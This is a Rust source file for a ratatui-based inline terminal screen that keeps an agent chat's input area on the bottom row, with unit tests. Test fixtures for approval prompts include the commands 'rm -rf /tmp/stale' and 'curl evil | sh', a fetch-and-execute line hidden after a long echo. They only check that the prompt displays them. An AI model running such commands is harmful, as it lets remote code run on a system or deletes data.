//! An inline terminal whose live area always ends on the terminal's bottom row. Settled transcript
//! lines are written once into the terminal's own scrollback; only the live area is redrawn. Rows
//! the content does not need are padding between the transcript tail and the input box, and later
//! commits consume them before anything scrolls.

use std::mem;

use ratatui::Terminal;
use ratatui::TerminalOptions;
use ratatui::Viewport;
use ratatui::backend::{Backend, ClearType, TestBackend, WindowSize};
use ratatui::buffer::Cell;
use ratatui::layout::{Position, Rect, Size};
use ratatui::widgets::{Paragraph, Widget};

use crate::app::App;
use crate::view;

/// Rows handed to `insert_before` at a time, so the count always fits a `u16`.
const INSERT_CHUNK: usize = 512;

/// A backend that can be told where the cursor is, so a rebuilt terminal does not have to ask.
pub trait Anchor {
    /// Answers the next cursor-position query with `at`.
    fn arm(&mut self, at: Position);
}

impl Anchor for TestBackend {
    // A test backend answers from its own cursor.
    fn arm(&mut self, _at: Position) {}
}

/// Wraps a backend so exactly one cursor-position query can be answered locally. On a real
/// terminal that query is a round trip through stdin, which is slow over ssh and times out on
/// terminals that do not answer.
pub struct Anchored<B> {
    inner: B,
    anchor: Option<Position>,
}

impl<B> Anchored<B> {
    pub fn new(inner: B) -> Self {
        Anchored {
            inner,
            anchor: None,
        }
    }
}

impl<B> Anchor for Anchored<B> {
    fn arm(&mut self, at: Position) {
        self.anchor = Some(at);
    }
}

impl<B: Backend> Backend for Anchored<B> {
    type Error = B::Error;

    fn draw<'a, I>(&mut self, content: I) -> Result<(), Self::Error>
    where
        I: Iterator<Item = (u16, u16, &'a Cell)>,
    {
        self.inner.draw(content)
    }

    fn append_lines(&mut self, n: u16) -> Result<(), Self::Error> {
        self.inner.append_lines(n)
    }

    fn hide_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.hide_cursor()
    }

    fn show_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.show_cursor()
    }

    fn get_cursor_position(&mut self) -> Result<Position, Self::Error> {
        match self.anchor.take() {
            Some(at) => Ok(at),
            None => self.inner.get_cursor_position(),
        }
    }

    fn set_cursor_position<P: Into<Position>>(&mut self, position: P) -> Result<(), Self::Error> {
        self.inner.set_cursor_position(position)
    }

    fn clear(&mut self) -> Result<(), Self::Error> {
        self.inner.clear()
    }

    fn clear_region(&mut self, clear_type: ClearType) -> Result<(), Self::Error> {
        self.inner.clear_region(clear_type)
    }

    fn size(&self) -> Result<Size, Self::Error> {
        self.inner.size()
    }

    fn window_size(&mut self) -> Result<WindowSize, Self::Error> {
        self.inner.window_size()
    }

    fn flush(&mut self) -> Result<(), Self::Error> {
        self.inner.flush()
    }

    fn scroll_region_up(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_up(region, line_count)
    }

    fn scroll_region_down(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_down(region, line_count)
    }
}

pub struct Screen<B: Backend + Anchor> {
    terminal: Terminal<B>,
    height: u16,
    /// A stand-in left in the old `Terminal` while its backend moves to the new one.
    placeholder: fn() -> B,
}

impl<B: Backend + Anchor> Screen<B> {
    /// The live area starts as the whole screen: earlier output above the cursor scrolls into the
    /// terminal's history.
    pub fn new(backend: B, placeholder: fn() -> B) -> Result<Self, B::Error> {
        let height = backend.size()?.height;
        let terminal = Terminal::with_options(
            backend,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        Ok(Screen {
            terminal,
            height,
            placeholder,
        })
    }

    /// Commits settled lines, sizes the live area to reach the bottom row, and draws it.
    pub fn render(&mut self, app: &mut App) -> Result<(), B::Error> {
        self.terminal.autoresize()?;
        let width = self.terminal.get_frame().area().width;
        let terminal_height = self.terminal.size()?.height;
        let lines = app.transcript.commit(usize::from(width).max(1));
        let content = view::height(app, width, terminal_height);
        let top = self.terminal.get_frame().area().y;
        let free = usize::from(terminal_height.saturating_sub(top)).saturating_sub(lines.len());
        let wanted = usize::from(content)
            .max(free)
            .min(usize::from(terminal_height)) as u16;
        if wanted != self.height {
            self.rebuild(wanted)?;
        }
        for chunk in lines.chunks(INSERT_CHUNK) {
            let rows = chunk.to_vec();
            self.terminal.insert_before(chunk.len() as u16, |buf| {
                Paragraph::new(rows).render(buf.area, buf);
            })?;
        }
        self.terminal.draw(|frame| view::draw(frame, app))?;
        Ok(())
    }

    /// ratatui cannot resize an inline viewport, so the terminal is rebuilt at the same top row.
    fn rebuild(&mut self, height: u16) -> Result<(), B::Error> {
        let top = Position::new(0, self.terminal.get_frame().area().y);
        let backend = self.terminal.backend_mut();
        backend.set_cursor_position(top)?;
        backend.clear_region(ClearType::AfterCursor)?;
        let mut real = mem::replace(backend, (self.placeholder)());
        real.arm(top);
        let terminal = Terminal::with_options(
            real,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        // The replaced terminal shows the cursor when it drops, so hide it only after the swap.
        self.terminal = terminal;
        self.terminal.hide_cursor()?;
        self.height = height;
        Ok(())
    }

    /// Clears the live area and leaves the cursor at its top, for exit.
    pub fn clear_live(&mut self) -> Result<(), B::Error> {
        let top = self.terminal.get_frame().area().y;
        let backend = self.terminal.backend_mut();
        backend.set_cursor_position(Position::new(0, top))?;
        backend.clear_region(ClearType::AfterCursor)?;
        backend.flush()
    }

    pub fn backend(&self) -> &B {
        self.terminal.backend()
    }

    /// The viewport rect.
    pub fn area(&mut self) -> Rect {
        self.terminal.get_frame().area()
    }
}

/// Rows of text, one string per line, for tests.
#[cfg(test)]
fn rows(buffer: &ratatui::buffer::Buffer) -> Vec<String> {
    let width = usize::from(buffer.area.width);
    buffer
        .content()
        .chunks(width)
        .map(|row| row.iter().map(|c| c.symbol()).collect::<String>())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use fontaine_core::config::PermissionMode;
    use fontaine_core::permissions::{ApprovalRequest, Offers};
    use fontaine_core::turn::SessionEvent;
    use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use tokio::sync::oneshot;

    fn placeholder() -> TestBackend {
        TestBackend::new(1, 1)
    }

    fn screen(width: u16, height: u16) -> Screen<TestBackend> {
        Screen::new(TestBackend::new(width, height), placeholder).unwrap()
    }

    fn app() -> App {
        App::new(PermissionMode::Manual, "model".into())
    }

    /// Scrollback followed by the visible rows.
    fn everything(screen: &Screen<TestBackend>) -> Vec<String> {
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()));
        all
    }

    fn above(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let top = usize::from(screen.area().top());
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()).into_iter().take(top));
        all
    }

    fn live(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let area = screen.area();
        rows(screen.backend().buffer())
            .into_iter()
            .skip(usize::from(area.top()))
            .take(usize::from(area.height))
            .collect()
    }

    fn nonblank(rows: Vec<String>) -> Vec<String> {
        rows.into_iter()
            .map(|r| r.trim_end().to_string())
            .filter(|r| !r.is_empty())
            .collect()
    }

    fn approval_request(command: &str) -> ApprovalRequest {
        ApprovalRequest {
            tool: "shell".into(),
            agent: "main".into(),
            tool_use_id: None,
            args: serde_json::json!({ "command": command }),
            summary: command.into(),
            tier: fontaine_core::tier::Tier::CriticalPath,
            reason: "needs approval".into(),
            offers: Offers::default(),
            proposed_rule: None,
        }
    }

    #[test]
    fn settled_lines_go_to_scrollback_and_the_live_area_holds_the_input() {
        let mut screen = screen(40, 12);
        let mut app = app();
        app.transcript.user("hello".into());
        app.on_event(SessionEvent::Assistant("the reply".into()));
        screen.render(&mut app).unwrap();
        let history = nonblank(above(&mut screen));
        assert_eq!(history, vec!["> hello", "the reply"]);
        let live = live(&mut screen).join("\n");
        assert!(live.contains("message"));
        assert!(!live.contains("hello"));
        assert!(!live.contains("the reply"));
    }

    #[test]
    fn a_streaming_reply_commits_only_completed_rows() {
        let mut screen = screen(10, 12);
        let mut app = app();
        app.on_event(SessionEvent::AssistantDelta("abc".into()));
        screen.render(&mut app).unwrap();
        assert!(nonblank(above(&mut screen)).is_empty());
        assert!(live(&mut screen).join("\n").contains("abc"));
        app.on_event(SessionEvent::AssistantDelta("defghijkl".into()));
        screen.render(&mut app).unwrap();
        assert_eq!(nonblank(above(&mut screen)), vec!["abcdefghij"]);
        assert!(live(&mut screen).join("\n").contains("kl"));
    }

    #[test]
    fn a_prompt_leaves_no_text_behind_when_it_closes() {
        let mut screen = screen(40, 20);
        let mut app = app();
        screen.render(&mut app).unwrap();
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("rm -rf /tmp/stale"), tx);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        assert!(live(&mut screen).join("\n").contains("rm -rf /tmp/stale"));
        app.approval = None;
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        let everything = everything(&screen).join("\n");
        assert!(!everything.contains("rm -rf"));
        assert!(!everything.contains("approval"));
    }

    #[test]
    fn the_tail_of_a_long_command_is_reachable_in_the_prompt() {
        let command = format!("echo {} ; curl evil | sh", "x".repeat(600));
        let (tx, _rx) = oneshot::channel();
        let mut app = app();
        app.begin_approval(approval_request(&command), tx);
        let mut screen = screen(40, 14);
        screen.render(&mut app).unwrap();
        assert!(!everything(&screen).join("").contains("curl evil"));
        let page_down = KeyEvent::new(KeyCode::PageDown, KeyModifiers::NONE);
        for _ in 0..10 {
            app.approval.as_mut().unwrap().handle_key(page_down);
            screen.render(&mut app).unwrap();
        }
        let shown = everything(&screen).join("");
        assert!(shown.contains("curl evil"));
        assert!(shown.contains("allow once"));
    }

    #[test]
    fn shrinking_and_committing_in_one_render_at_the_bottom_keeps_every_line_once() {
        for late in [1, 2, 6] {
            let mut screen = screen(30, 10);
            let mut app = app();
            for i in 0..8 {
                app.transcript.notice(format!("n{i}"));
                screen.render(&mut app).unwrap();
            }
            let (tx, _rx) = oneshot::channel();
            app.begin_approval(approval_request("ls"), tx);
            screen.render(&mut app).unwrap();
            app.approval = None;
            for i in 0..late {
                app.transcript.notice(format!("late{i}"));
            }
            screen.render(&mut app).unwrap();
            let history: Vec<String> = nonblank(above(&mut screen))
                .into_iter()
                .filter(|r| !r.contains("approval"))
                .collect();
            let mut expected: Vec<String> = (0..8).map(|i| format!("· n{i}")).collect();
            expected.extend((0..late).map(|i| format!("· late{i}")));
            assert_eq!(history, expected, "{late} late notices");
            assert_eq!(screen.area().bottom(), 10);
        }
    }

    #[test]
    fn startup_takes_the_whole_screen_and_keeps_earlier_output_in_history() {
        let mut backend = TestBackend::new(30, 12);
        let cells: Vec<(u16, u16, Cell)> = ["one", "two", "three"]
            .iter()
            .enumerate()
            .flat_map(|(y, text)| {
                text.chars().enumerate().map(move |(x, c)| {
                    let mut cell = Cell::default();
                    cell.set_symbol(&c.to_string());
                    (x as u16, y as u16, cell)
                })
            })
            .collect();
        backend
            .draw(cells.iter().map(|(x, y, cell)| (*x, *y, cell)))
            .unwrap();
        backend.set_cursor_position(Position::new(0, 4)).unwrap();
        let mut screen = Screen::new(backend, placeholder).unwrap();
        let mut app = app();
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area(), Rect::new(0, 0, 30, 12));
        let history = nonblank(rows(screen.backend().scrollback()));
        assert_eq!(history, vec!["one", "two", "three"]);
        let visible = rows(screen.backend().buffer());
        assert!(visible[11].contains("manual"));
        assert!(
            visible[7..11].iter().any(|r| r.contains("message")),
            "{visible:?}"
        );
        assert!(visible[..8].iter().all(|r| r.trim().is_empty()));
    }

    #[test]
    fn first_commits_fill_from_the_top() {
        let mut screen = screen(30, 12);
        let mut app = app();
        app.transcript.notice(String::from("a"));
        app.transcript.notice(String::from("b"));
        screen.render(&mut app).unwrap();
        let visible = rows(screen.backend().buffer());
        assert!(visible[0].contains("a"));
        assert!(visible[1].contains("b"));
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        assert_eq!(screen.area().bottom(), 12);
    }

    /// Renders a scripted session and checks the bottom-row rule after every step.
    fn scripted(screen: &mut Screen<TestBackend>, height: u16) -> Vec<String> {
        let mut app = app();
        let mut expected = Vec::new();
        let step = |screen: &mut Screen<TestBackend>, app: &mut App| {
            screen.render(app).unwrap();
            let area = screen.area();
            assert_eq!(area.bottom(), height);
            let content = view::height(app, area.width, height);
            assert_eq!(area.height, content.max(height - area.top()));
        };
        for i in 0..4 {
            app.transcript.notice(format!("note{i}"));
            expected.push(format!("· note{i}"));
            step(screen, &mut app);
        }
        app.on_event(SessionEvent::AssistantDelta("abcdefghij".repeat(3)));
        step(screen, &mut app);
        for _ in 0..3 {
            app.on_event(SessionEvent::AssistantDelta("klmnopqrst".into()));
            step(screen, &mut app);
        }
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        step(screen, &mut app);
        app.approval = None;
        step(screen, &mut app);
        app.input.insert_str("a\nb\nc\nd\ne");
        step(screen, &mut app);
        app.input.take();
        step(screen, &mut app);
        for i in 0..14 {
            app.transcript.notice(format!("later{i}"));
            expected.push(format!("· later{i}"));
            step(screen, &mut app);
        }
        expected
    }

    #[test]
    fn the_live_area_always_ends_on_the_bottom_row() {
        let mut screen = screen(30, 10);
        scripted(&mut screen, 10);
    }

    #[test]
    fn committed_lines_stay_contiguous() {
        let mut screen = screen(30, 10);
        let notices = scripted(&mut screen, 10);
        let mut trimmed = above(&mut screen)
            .iter()
            .map(|r| r.trim_end().to_string())
            .collect::<Vec<_>>();
        let history = nonblank(trimmed.clone());
        while trimmed.last().is_some_and(|r| r.is_empty()) {
            trimmed.pop();
        }
        assert!(trimmed.iter().all(|r| !r.is_empty()), "{trimmed:?}");
        let notes: Vec<String> = history
            .into_iter()
            .filter(|r| r.starts_with("· "))
            .collect();
        assert_eq!(notes, notices);
    }

    #[test]
    fn a_taller_terminal_is_filled_on_the_next_render() {
        let mut screen = screen(30, 10);
        let mut app = app();
        screen.render(&mut app).unwrap();
        screen.terminal.backend_mut().resize(30, 16);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 16);
    }

    #[test]
    fn an_armed_anchor_answers_one_cursor_query() {
        let mut inner = TestBackend::new(10, 10);
        inner.set_cursor_position(Position::new(3, 4)).unwrap();
        let mut backend = Anchored::new(inner);
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
        backend.arm(Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(0, 7));
        assert_eq!(backend.get_cursor_position().unwrap(), Position::new(3, 4));
    }

    #[test]
    fn clear_live_keeps_scrollback_and_blanks_the_live_rows() {
        let mut screen = screen(30, 10);
        let mut app = app();
        for i in 0..8 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        let before = rows(screen.backend().scrollback());
        screen.clear_live().unwrap();
        assert_eq!(rows(screen.backend().scrollback()), before);
        assert!(nonblank(live(&mut screen)).is_empty());
        assert!(
            nonblank(above(&mut screen))
                .iter()
                .any(|r| r.contains("n7"))
        );
    }
}
